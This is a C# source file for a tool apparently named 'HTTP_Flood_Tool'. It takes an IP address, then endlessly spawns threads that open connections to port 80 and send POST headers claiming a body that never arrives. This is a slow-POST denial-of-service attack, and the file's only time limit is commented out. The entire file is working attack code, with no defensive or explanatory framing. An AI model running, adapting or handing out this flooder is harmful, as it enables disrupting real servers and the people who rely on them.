using System;
using System.Collections.Generic;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.IO;


namespace HTTP_Flood_Tool
{
    public class HTTPFlood
    {
        
    }

    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 1)
            {
                System.Console.WriteLine("Please enter IP.");
                return;
            }
            SendFlood(args[0]);
        }

        static bool isRunning = true;
        static TcpClient[] tcp = new TcpClient[2];
        static TcpClient workTcp = new TcpClient();
        private static List<TcpClient> clients = null;
        private static Thread thread = null;
        static IPAddress workIP;

        public static void Flood(string host, bool looping)
        {
            isRunning = looping;
        }

        public static void SendFlood(string ip)
        {
            try
            {
                clients = new List<TcpClient>();
                isRunning = true;
                int seconds = 0;
                while (isRunning)
                {
                    //if (seconds >= 30)
                    //{
                   //     StopFlood();
                   //     return;
                   // }

                    thread = new Thread(u =>
                    {
                        try
                        {
                            workTcp = new TcpClient();
                            workIP = IPAddress.Parse(ip);
                            clients.Add(workTcp);

                            workTcp.Connect(ip, 80);
                            if (workTcp.Connected)
                            {
                                StreamWriter sWriter = new StreamWriter(workTcp.GetStream());
                                sWriter.Write("POST / HTTP/1.1\r\nHost: {0} \r\nContent-length: 5235\r\n\r\n", workIP.ToString());
                                sWriter.Flush();
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.Write("Error:" + ex.Message + "\n:::: EXCEPTION (" + ex.ToString() + ") \n IP: " + ip + "\n");
                        }
                    });
                    thread.Start();
                    Thread.Sleep(100);
                    seconds++;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("PANIC: " + ex.Message + " " + ex.StackTrace);
            }
        }
        public static void StopFlood()
        {
            if (clients != null)
            {
                foreach (TcpClient client in clients)
                {
                    try
                    {
                        client.GetStream().Dispose();
                    }
                    catch
                    {
                        Console.WriteLine("Could not dispose tcp stream!");
                    }
                }
            }
            thread.Abort();
            workTcp.Close();
            isRunning = false;
            clients = null;
            Console.WriteLine(DateTime.Now.ToShortTimeString() + " stopped slowing..\n");
        }
    }
}
